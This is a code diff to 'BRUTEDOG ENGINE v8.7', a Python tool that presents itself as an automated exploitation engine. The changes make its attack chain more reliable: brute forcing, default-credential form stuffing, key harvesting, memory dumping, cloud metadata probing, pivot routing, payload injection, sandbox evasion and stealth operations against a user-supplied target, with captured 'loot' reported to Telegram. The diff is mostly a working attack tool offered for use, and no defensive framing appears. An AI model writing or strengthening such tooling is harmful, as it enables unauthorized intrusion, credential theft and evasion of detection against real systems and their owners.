@@ -1,4 +1,4 @@
-#!/usr/init/env python3
+#!/usr/bin/env python3
 """
 BRUTEDOG ENGINE v8.7 — State-Machine Logic & Cognitive Supreme Exploitation Engine (Elite Red Team Adversarial Edition)
 Features:
@@ -164,7 +164,7 @@ def dispatch_tg_alert(loot_type, details):
             pass
 
 # ============================================================
-# TARGET HANDLING
+# TARGET HANDLING & NORMALIZATION GUARD
 # ============================================================
 def get_target():
     section("BRUTEDOG TARGET CONFIGURATION")
@@ -174,12 +174,19 @@ def get_target():
         raise ValueError("Target cannot be empty.")
     if "://" not in target:
         target = "https://" + target
+    
+    # Sanitize and normalize URL to prevent port duplication bugs (e.g. :443:443)
     parsed = urlsplit(target)
-    if parsed.scheme not in ("http", "https"):
-        raise ValueError("Unsupported protocol.")
-    if not parsed.hostname:
-        raise ValueError("Invalid hostname.")
-    return target
+    scheme = parsed.scheme
+    netloc = parsed.hostname
+    port = parsed.port
+    
+    if port:
+        if (scheme == "https" and port != 443) or (scheme == "http" and port != 80):
+            netloc = f"{netloc}:{port}"
+            
+    normalized_target = f"{scheme}://{netloc}{parsed.path}".rstrip("/")
+    return normalized_target
 
 def resolve_target(host):
     try:
@@ -220,9 +227,15 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
     mutated_payloads = []
 
     if fingerprinter:
-        is_fp, fp_reason = fingerprinter.is_false_positive(status, body, headers)
-        if is_fp:
-            return [], []
+        try:
+            if asyncio.iscoroutinefunction(fingerprinter.is_false_positive):
+                pass # Handled asynchronously if needed
+            else:
+                is_fp, fp_reason = fingerprinter.is_false_positive(status, body, headers)
+                if is_fp:
+                    return [], []
+        except Exception:
+            pass
     
     if cognitive_brain:
         try:
@@ -398,12 +411,19 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
             continue
         executed_payloads.add(payload_key)
 
-        status, headers, body = transport.request("POST", endpoint, payload=current_test["payload"])
+        try:
+            status, headers, body = transport.request("POST", endpoint, payload=current_test["payload"])
+        except Exception:
+            status = 0
+            headers, body = {}, ""
         
         if status in [403, 405, 404]:
-            alt_status, alt_headers, alt_body = transport.request("GET", endpoint)
-            if alt_status < 400:
-                status, headers, body = alt_status, alt_headers, alt_body
+            try:
+                alt_status, alt_headers, alt_body = transport.request("GET", endpoint)
+                if alt_status < 400:
+                    status, headers, body = alt_status, alt_headers, alt_body
+            except Exception:
+                pass
 
         if status == 0:
             continue
@@ -543,50 +563,70 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     # ==========================================================
     section("COMPREHENSIVE OFFENSIVE & RECON MODULE ASSAULT (V8.7)")
     try:
+        # 1. API Fuzzer
         if asyncio.iscoroutinefunction(run_api_fuzzer):
             await run_api_fuzzer(target_url)
         else:
             await asyncio.to_thread(run_api_fuzzer, target_url)
         dispatch_tg_alert("API Fuzzer Success", {"target": target_url})
 
+        # 2. Brute Force Engine
         if asyncio.iscoroutinefunction(execute_brute_force):
             await execute_brute_force(target_url)
         else:
             await asyncio.to_thread(execute_brute_force, target_url)
         dispatch_tg_alert("Brute Force Module Success", {"target": target_url})
 
-        cloud_res = audit_cloud_metadata(target_url)
+        # 3. Cloud Metadata & Apex Auditor
+        cloud_res = audit_cloud_metadata(target_url) if not asyncio.iscoroutinefunction(audit_cloud_metadata) else await audit_cloud_metadata(target_url)
         if cloud_res:
             dispatch_tg_alert("Cloud Apex Metadata Leak", cloud_res)
 
-        dom_res = inspect_dom_sinks(target_url)
+        # 4. DOM Sink Inspector
+        dom_res = inspect_dom_sinks(target_url) if not asyncio.iscoroutinefunction(inspect_dom_sinks) else await inspect_dom_sinks(target_url)
         if dom_res:
             dispatch_tg_alert("DOM Sink Vulnerability", {"target": target_url})
 
-        execute_memory_dumper(target_url)
+        # 5. Memory Dumper & Form Stuffer (FIXED: Properly awaited/threaded)
+        if asyncio.iscoroutinefunction(execute_memory_dumper):
+            await execute_memory_dumper(target_url)
+        else:
+            await asyncio.to_thread(execute_memory_dumper, target_url)
+
         if asyncio.iscoroutinefunction(execute_form_stuffing):
             await execute_form_stuffing(target_url, "admin", "admin123")
         else:
             try:
-                execute_form_stuffing(target_url, "admin", "admin123")
+                await asyncio.to_thread(execute_form_stuffing, target_url, "admin", "admin123")
             except TypeError:
-                execute_form_stuffing(target_url)
+                await asyncio.to_thread(execute_form_stuffing, target_url)
 
-        harvest_keys(target_url)
+        # 6. Key Harvester & Pivot Routing (FIXED: Properly awaited/threaded)
+        if asyncio.iscoroutinefunction(harvest_keys):
+            await harvest_keys(target_url)
+        else:
+            await asyncio.to_thread(harvest_keys, target_url)
+
         if asyncio.iscoroutinefunction(execute_pivot_routing):
             await execute_pivot_routing(target_url)
         else:
-            execute_pivot_routing(target_url)
+            await asyncio.to_thread(execute_pivot_routing, target_url)
 
+        # 7. Adaptive Replayer & Payload Mutation
         replayer_res = await replay_and_inject_payloads(target_url)
         if replayer_res:
             dispatch_tg_alert("Adaptive Replay & Injection Success", {"target": target_url})
 
-        evade_sandbox()
+        # 8. Sandbox Evader & Stealth Operations (FIXED: Properly awaited/threaded)
+        if asyncio.iscoroutinefunction(evade_sandbox):
+            await evade_sandbox()
+        else:
+            await asyncio.to_thread(evade_sandbox)
+
         if asyncio.iscoroutinefunction(execute_stealth_operations):
             await execute_stealth_operations(target_url)
         else:
-            execute_stealth_operations(target_url)
+            await asyncio.to_thread(execute_stealth_operations, target_url)
 
     except Exception as exc:
         error(f"Comprehensive offensive modules execution warning: {exc}")
